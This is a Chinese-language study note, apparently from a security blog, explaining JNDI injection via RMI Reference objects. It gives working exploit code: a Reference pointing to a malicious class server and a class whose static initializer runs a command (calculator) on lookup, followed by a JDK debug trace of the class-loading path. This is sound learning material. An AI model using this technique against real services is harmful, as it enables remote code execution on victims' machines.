## JNDI

Java命名与目录结构，类比成一个字典，JDK默认包含以下几种:

* 轻量级目录访问协议(LDAP) (并不是Java特有的东西，计算机域也有)
* 通用对象请求代理架构(CORBA)通用对象服务(COS)名称服务
* Java远程方法调用(RMI)注册表
* 域名服务(DNS)

### RMI

#### RMI的写法回顾:

创建一个`RMIServer`

```java
public class RMIServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException, NamingException {
        // 实例化远程对象
        RemoteObj remoteObj = new RemoteObjImpl();//这一步已经开了端口，但是客户端并不知道，所以借助注册中心
        // 创建注册中心
        Registry registry = LocateRegistry.createRegistry(1099);
        // 绑定对象示例到注册中心
        registry.bind("remoteObj", remoteObj);
    }
}
```

客户端调用`RMIClient`

```java
public class RMIClient {
    public static  void  main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        RemoteObj remoteObj = (RemoteObj) registry.lookup("remoteObj");
        remoteObj.sayHello("hello");
    }
}
```

具体对象逻辑

```java
public interface RemoteObj extends Remote {
    public String sayHello(String keywords) throws RemoteException;
}
```

```java
public class RemoteObjImpl extends UnicastRemoteObject implements RemoteObj{
    public RemoteObjImpl() throws RemoteException {
            //UnicastRemoteObject.exportObject(this, 0); // 如果不能继承 UnicastRemoteObject 就需要手工导出
    }
    @Override
    public String sayHello(String keywords) throws RemoteException {
        String upKeywords = keywords.toUpperCase();
        System.out.println(upKeywords);
        return upKeywords;
    }
}
```

#### 与JNDI结合:

创建初始上下文，`InitialContext`

```JAVA
public class RMIServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException, NamingException {
        InitialContext initialContext = new InitialContext();
        // 实例化远程对象
        RemoteObj remoteObj = new RemoteObjImpl();//这一步已经开了端口，但是客户端并不知道，所以借助注册中心
        // 创建注册中心
        Registry registry = LocateRegistry.createRegistry(1099);
        // 绑定对象示例到注册中心
        initialContext.rebind("rmi://localhost:1099/remoteObj",new RemoteObjImpl());
        //registry.bind("remoteObj", remoteObj);
    }
}
```

调用
```java
public class RMIClient {
    public static  void  main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        RemoteObj remoteObj = (RemoteObj)initialContext.lookup("rmi://localhost:1099/remoteOBj");
        //Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        //RemoteObj remoteObj = (RemoteObj) registry.lookup("remoteObj");
        remoteObj.sayHello("hello");
    }
}
```

因为建立在rmi之上，所以之前攻击RMI的方式也是可行的。

#### 通过绑定引用对象攻击

https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html

绑定到引用对象
```java
public class RMIServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException, NamingException {
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);
        //绑定引用
        Reference refObj = new Reference("TestRef","TestRef","http://localhost:8000");//开一个恶意服务器
        initialContext.rebind("rmi://localhost:1099/remoteObj",refObj);
    }
}
```

可以看看Reference类

```java
public Reference(String className, String factory, String factoryLocation) {
    this(className);
    classFactory = factory;
    classFactoryLocation = factoryLocation;
}
```

写一个恶意类编译好，开个http服务用来攻击,注意与前面绑定的`Reference`名称参数保持一致

```java
import java.io.IOException;
public class TestRef {
    static{
        try {
            Runtime.getRuntime().exec("gnome-calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

查找引用对象

```java
public class RMIClient {
    public static  void  main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        RemoteObj remoteObj = (RemoteObj)initialContext.lookup("rmi://localhost:1099/remoteOBj");
        remoteObj.sayHello("hello");
    }
}
```

查询时会触发攻击。

由此看见如果绑定地址可以控制，那么就可能造成漏洞

#### 调试跟进分析

从调用`lookup`开始，进入

```java
public Object lookup(String var1) throws NamingException {
    ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);
    Context var3 = (Context)var2.getResolvedObj();
    Object var4;
    try {
🔴         var4 = var3.lookup(var2.getRemainingName());
    } finally {
        var3.close();
    }
    return var4;
}
```

跟进看看`lookup`

```java
public Object lookup(Name var1) throws NamingException {
    if (var1.isEmpty()) {
        return new RegistryContext(this);
    } else {
        Remote var2;
        try {
            var2 = this.registry.lookup(var1.get(0));
        } catch (NotBoundException var4) {
            throw new NameNotFoundException(var1.get(0));
        } catch (RemoteException var5) {
            throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
        }
🔴        return this.decodeObject(var2, var1.getPrefix(1));
    }
}
```

这里`decodeObject`看起来是关键逻辑，进去看看

```java
private Object decodeObject(Remote var1, Name var2) throws NamingException {
    try {
        Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
🔴      return NamingManager.getObjectInstance(var3, var2, this, this.environment);
    } catch (NamingException var5) {
        throw var5;
    } catch (RemoteException var6) {
        throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
    } catch (Exception var7) {
        NamingException var4 = new NamingException();
        var4.setRootCause(var7);
        throw var4;
    }
}
```

`getObjectInstance`中获取工厂`getObjectFactoryFromReference`是Reference的用法，同时会有类加载以及实例化的过程，下断点去调一下

```java
public static Object
    getObjectInstance(Object refInfo, Name name, Context nameCtx,
                      Hashtable<?,?> environment)
    throws Exception
{

    ObjectFactory factory;

    // Use builder if installed
    ObjectFactoryBuilder builder = getObjectFactoryBuilder();
    if (builder != null) {
        // builder must return non-null factory
        factory = builder.createObjectFactory(refInfo, environment);
        return factory.getObjectInstance(refInfo, name, nameCtx,
            environment);
    }

    // Use reference if possible
    Reference ref = null;
    if (refInfo instanceof Reference) {
        ref = (Reference) refInfo;
    } else if (refInfo instanceof Referenceable) {
        ref = ((Referenceable)(refInfo)).getReference();
    }

    Object answer;

    if (ref != null) {
        String f = ref.getFactoryClassName();
        if (f != null) {
            // if reference identifies a factory, use exclusively

🔴          factory = getObjectFactoryFromReference(ref, f);
            if (factory != null) {
                return factory.getObjectInstance(ref, name, nameCtx,
                                                 environment);
            }
            // No factory found, so return original refInfo.
            // Will reach this point if factory class is not in
            // class path and reference does not contain a URL for it
            return refInfo;

        } else {
            // if reference has no factory, check for addresses
            // containing URLs

            answer = processURLAddrs(ref, name, nameCtx, environment);
            if (answer != null) {
                return answer;
            }
        }
    }

    // try using any specified factories
    answer =
        createObjectFromFactories(refInfo, name, nameCtx, environment);
    return (answer != null) ? answer : refInfo;
}
```

走到一处静态方法，try语句中进行类的加载，首先会使用AppClassLoader本地找，找不到获取codebase（对应我们写的本地python开的服务器)调用URLClassLoader去找。同时在最后一句可以看到进行了类的实例化。

```java
    static ObjectFactory getObjectFactoryFromReference(
        Reference ref, String factoryName)
        throws IllegalAccessException,
        InstantiationException,
        MalformedURLException {
        Class<?> clas = null;

        // Try to use current class loader
        try {
             clas = helper.loadClass(factoryName);
        } catch (ClassNotFoundException e) {
            // ignore and continue
            // e.printStackTrace();
        }
        // All other exceptions are passed up.

        // Not in class path; try to use codebase
        String codebase;
        if (clas == null &&
                (codebase = ref.getFactoryClassLocation()) != null) {
            try {
                clas = helper.loadClass(factoryName, codebase);
            } catch (ClassNotFoundException e) {
            }
        }

        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
    }

```

```java
public Class<?> loadClass(String className, String codebase)
        throws ClassNotFoundException, MalformedURLException {

    ClassLoader parent = getContextClassLoader();
    ClassLoader cl =
             URLClassLoader.newInstance(getUrlArray(codebase), parent);

    return loadClass(className, cl);
}
```

#### JNDI+LDAP绕过
